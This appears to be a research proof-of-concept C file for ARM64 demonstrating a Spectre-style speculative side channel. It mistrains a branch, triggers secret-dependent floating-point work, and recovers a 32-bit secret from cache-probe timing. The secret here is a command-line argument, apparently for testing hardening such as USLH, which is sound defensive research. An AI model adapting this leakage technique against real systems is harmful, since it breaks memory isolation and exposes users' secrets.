#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <arm_neon.h>
#include "timing.h"
// #include <x86intrin.h>
// #include <xmmintrin.h>

#define FAST 0x40f0000000000000
#define SLOW 0x0010deadbeef1337
#define SIZE 256
#define STRIDE 128
// #define  memory_fence() asm volatile ("lfence;\nmfence;\nsfence");
//void memory_fence()
//{
// asm volatile("dmb sy;\nisb sy;\n");
//}
//replacement for CLFLUSH
#define FLUSH_CACHE_LINE(addr) \
{ \
    asm volatile ("dc civac, %0" : : "r" (addr) : "memory"); \
}

//this is the replacement  for __rdtscp
static inline uint64_t READ_CNTVCT_EL0(void) {
    uint64_t val;
    asm volatile("mrs %0, cntvct_el0" : "=r" (val));
    return val;
}

uint64_t global_variable = 0xf;
uint64_t tmp;
unsigned int dummy;
uint64_t start, end;
double value;
static uint8_t array[SIZE * STRIDE] __attribute__((aligned(128)));
uint64_t fast, slow;


//32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25

//big_array has to be this size!
static uint32_t big_array[33554432] __attribute__((aligned(128)));
static uint32_t big_array2[33554432];
static uint32_t big_array3[33554432];

void __attribute__((optnone)) flush_cache()
{
  
  for (int i = 0; i < 33554432; i++)
  {
    big_array[i] = i;
  }
}

double __attribute__((optnone)) victim_function(register int secret, register int bit, int isPublic)
{
    memory_access(&global_variable);
  for (volatile int i = 0; i < 1000; i++);
   memory_fence();

  if (isPublic < array[0x2 * STRIDE]) {
    uint64_t tmp = ((secret >> bit) & 1) ? 0x40f0000000000000 : 0x0010deadbeef1337;

    // USLH will harden this operation
    volatile double tmp2 = tmp * tmp;
    
    asm volatile (
        // "1: \n"  // Label for the loop start
        ".rept 1\n\t"  // Repeat the following instructions 47 times
        "fsqrt d0, d0\n\t"  // Compute the square root of the double-precision value in d0
        "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
        ".endr\n\t"
    );
    memory_access(&global_variable);
  }
  return 0;
}


int main(int argc, char *argv[])
{
  volatile double tmp_value1, tmp_value, tmp_value2;
  timer_start();
  int secret = atoi(argv[1]);
  int threshold = atoi(argv[2]);
  int guess = 0;

  memory_fence();

  for (int i = 0; i < sizeof(array); i++)
    array[i] = 0x0;
  array[0x2 * STRIDE] = 10;

  flush_cache();
  memory_fence();
  uint64_t result[32] = {0};

  for (volatile int i = 0; i < 32; i++) {
    memory_fence();

    //Train victim function
    victim_function(0,0,0);
    victim_function(0,0,0);
    victim_function(0,0,0);
    victim_function(0,0,0);
    victim_function(0,0,0);
    victim_function(0,0,0);

    memory_fence();

    //Flush the global values
    //FLUSH_CACHE_LINE(&array[0x2 * STRIDE]);
    //FLUSH_CACHE_LINE(&global_variable);
    flush_cache();
    memory_fence();

    //attacker calls victim
    victim_function(secret, i, 100);

    memory_fence();

    //Probe cache to see if its a hit
    uint64_t time = probe(&global_variable);
    memory_fence();

    //if probe time passes threshold, then guess 1, otherwise guess 0
    int tmp = time > threshold ? 0 : 1;
    result[i] = tmp;
    guess = guess | (tmp << i);
    memory_fence();

     //noops
    asm volatile (".rept 4096;\nnop;\n.endr;");
  }
  memory_fence();
  for (int i = 0; i < 32; i++)
    printf("%3ld ", result[i]);
  printf("Guess : %3d, --> %d\n", guess, guess == secret ? 1 : 0);

    timer_stop();

}
